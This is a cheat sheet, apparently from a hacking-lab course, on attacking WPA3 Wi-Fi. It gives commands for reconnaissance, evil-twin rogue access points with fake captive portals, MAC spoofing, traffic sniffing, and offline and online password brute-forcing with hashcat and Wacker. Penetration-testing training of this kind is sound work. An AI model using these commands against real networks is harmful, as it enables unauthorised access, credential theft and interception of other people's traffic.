# Attacking Wpa3 Wi Fi Networks


---
## Page 1

Attacking WPA3 Wi-Fi Networks
Reconnaissance (OWE & SAE)
Command
Description
sudo airmon-ng start wlan0
Set the wlan0 interface to monitor
mode
sudo airodump-ng wlan0mon
Scan for nearby access points
sudo airodump-ng --bssid a6:89:f8:b8:78 -c 1
-w OWE
Scan a specific BSSID on channel
1 and save the results to OWE-
01.*
sudo -E wireshark OWE-01.cap
View the OWE-01.cap capture file
with Wireshark
(wlan.fc.type == 0) && (wlan.fc.type_subtype
== 0x08)
Wireshark filter to find Beacon
Frames
eapol or ((wlan.fc.type == 00) &&
(wlan.fc.type_subtype == 0x00) or
(wlan.fc.type_subtype == 0x01))
Wireshark filter to find EAPOL
frames + association
request/response frames
ATTACKING WPA3 WI-FI NETWORKS
CHEAT SHEET

---
## Page 2

Evil Twins (OWE & SAE)
Command
Description
sudo hostapd hostapd.conf
Start a rogue AP with hostapd
python2 nagaw.py -i wlan1 -o wlan2 -t
demo
Start a fake captive portal with Nagaw
and forward incoming wlan1 traffic to
wlan2
sudo sh -c "echo 1 >
/proc/sys/net/ipv4/ip_forward"
Enable IP forwarding
sudo ifconfig wlan1 192.168.0.1/24
Set a valid IP address for wlan1
sudo dnsmasq -C dnsmasq.conf -d
Launch a DNS and DHCP server with
dnsmasq
sudo ifconfig wlan1 down
Shut down the wlan1 interface.
sudo macchanger -m D8:D6:3D:EB:29:D5
wlan1
Spoof the MAC address of the wlan1
interface.
sudo ifconfig wlan1 up
Start up the wlan1 interface
sudo tcpdump -i wlan1 -w HTB.cap
Sniff the traffic on wlan1 and output the
capture file to HTB.cap
Bruteforcing (Online & Offline)
Command
Description
cowpatty -c -r WPA-01.cap
Check if a captured handshake
is valid
hcxpcapngtool -o hash WPA-01.cap
Convert a captured handshake
to a hash format
hashcat -m 22000 hash /opt/wordlist.txt --
force
Crack WPA hash using hashcat

---
## Page 3

Command
Description
bash split.sh 4 /opt/wordlist.txt
Split a wordlist into four
segments for Wacker
sudo python3 wacker.py --interface wlan0 --
wordlist wordlist.txt.aaa --ssid HackMe --freq
2412 --bssid D8:D6:3D:EA:27:D3
Start online bruteforce using the
first wordlist segment on wlan0
with Wacker
sudo python3 wacker.py --interface wlan1 --
wordlist wordlist.txt.aab --ssid HackMe --freq
2412 --bssid D8:D6:3D:EA:27:D3
Start online bruteforce using the
second wordlist segment on
wlan1 with Wacker
sudo python3 wacker.py --interface wlan2 --
wordlist wordlist.txt.aac --ssid HackMe --freq
2412 --bssid D8:D6:3D:EA:27:D3
Start online bruteforce using the
third wordlist segment on wlan2
with Wacker
sudo python3 wacker.py --interface wlan3 --
wordlist wordlist.txt.aad --ssid HackMe --freq
2412 --bssid D8:D6:3D:EA:27:D3
Start online bruteforce using the
fourth wordlist segment on
wlan3 with Wacker